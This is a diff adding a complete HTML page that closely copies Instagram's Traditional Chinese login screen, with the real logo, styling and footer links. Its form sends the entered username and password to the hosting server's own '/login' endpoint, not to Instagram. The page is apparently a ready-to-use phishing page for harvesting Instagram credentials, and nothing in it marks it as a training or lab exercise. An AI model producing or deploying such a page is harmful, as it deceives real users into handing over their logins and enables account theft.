@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <title>Instagram 登入</title>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap">
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #fafafa;
+            font-family: 'Roboto', sans-serif;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .login-wrapper {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            width: 100%;
+            max-width: 350px;
+        }
+
+        .login-container {
+            background: white;
+            border: 1px solid #dbdbdb;
+            padding: 40px 20px;
+            width: 100%;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+
+        .login-container img {
+            margin-bottom: 20px;
+        }
+
+        .login-container form {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .login-container input {
+            border: 1px solid #dbdbdb;
+            border-radius: 4px;
+            padding: 12px;
+            margin-bottom: 12px;
+            font-size: 14px;
+            background: #fafafa;
+        }
+
+        .login-container button {
+            background: #3897f0;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background 0.3s;
+            font-size: 14px;
+        }
+
+        .login-container button:hover {
+            background: #3180d9;
+        }
+
+        .login-container .divider {
+            position: relative;
+            text-align: center;
+            margin: 20px 0;
+        }
+
+        .login-container .divider:before,
+        .login-container .divider:after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            width: 40%;
+            height: 1px;
+            background: #dbdbdb;
+        }
+
+        .login-container .divider:before {
+            left: 0;
+        }
+
+        .login-container .divider:after {
+            right: 0;
+        }
+
+        .login-container .divider span {
+            background: white;
+            padding: 0 10px;
+            font-size: 12px;
+            color: #999;
+        }
+
+        .login-container .alt-login {
+            color: #385185;
+            font-weight: 500;
+            text-decoration: none;
+            margin: 10px 0;
+        }
+
+        .login-container .alt-login:hover {
+            text-decoration: underline;
+        }
+
+        .signup-container {
+            text-align: center;
+            border: 1px solid #dbdbdb;
+            background: white;
+            padding: 20px;
+            width: 100%;
+        }
+
+        .signup-container a {
+            color: #3897f0;
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 14px;
+        }
+
+        .signup-container a:hover {
+            text-decoration: underline;
+        }
+
+        .footer {
+            text-align: center;
+            font-size: 12px;
+            color: #999;
+            padding: 10px;
+            width: 100%;
+            border-top: 1px solid #dbdbdb;
+            position: absolute;
+            bottom: 0;
+        }
+
+        .footer a {
+            color: #999;
+            text-decoration: none;
+            margin: 0 10px;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        @media (max-width: 600px) {
+            .login-wrapper {
+                padding: 0 20px;
+            }
+
+            .login-container, .signup-container {
+                width: 100%;
+            }
+        }
+
+        @media (max-width: 400px) {
+            .login-container {
+                padding: 30px 15px;
+            }
+
+            .signup-container {
+                padding: 15px;
+            }
+        }
+    </style>
+</head>
+<body>
+<div class="login-wrapper">
+    <div class="login-container">
+        <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram">
+        <form action="/login" method="post">
+            <input type="text" name="username" placeholder="手機號碼、用戶名稱或電子郵件地址" required>
+            <input type="password" name="password" placeholder="密碼" required>
+            <button type="submit">登入</button>
+        </form>
+        <div class="divider">
+            <span>或</span>
+        </div>
+        <a class="alt-login" href="https://www.instagram.com/accounts/password/reset/">忘記密碼？</a>
+    </div>
+    <div class="signup-container">
+        <a href="https://www.instagram.com/accounts/emailsignup/">建立新帳號</a>
+    </div>
+</div>
+
+<div class="footer">
+    <a href="https://about.meta.com/">Meta </a>
+    <a href="https://about.instagram.com/">關於 </a>
+    <a href="https://about.instagram.com/blog">部落格 </a>
+    <a href="https://about.instagram.com/about-us/careers">工作機會 </a>
+    <a href="https://help.instagram.com/">使用說明</a>
+    <a href="https://developers.facebook.com/docs/instagram">API </a>
+    <a href="https://privacycenter.instagram.com/policy/?entry_point=ig_help_center_data_policy_redirect">隱私 </a>
+    <a href="https://www.instagram.com/explore/locations/">地點 </a>
+    <a href="https://www.instagram.com/web/lite/">Instagram Lite </a>
+    <a href="https://www.threads.net/">Threads </a>
+    <a href="https://www.facebook.com/help/instagram/261704639352628">聯絡人上傳和非用戶 </a>
+    <a href="https://about.meta.com/technologies/meta-verified/">Meta驗證</a>
+</div>
+</body>
+</html>
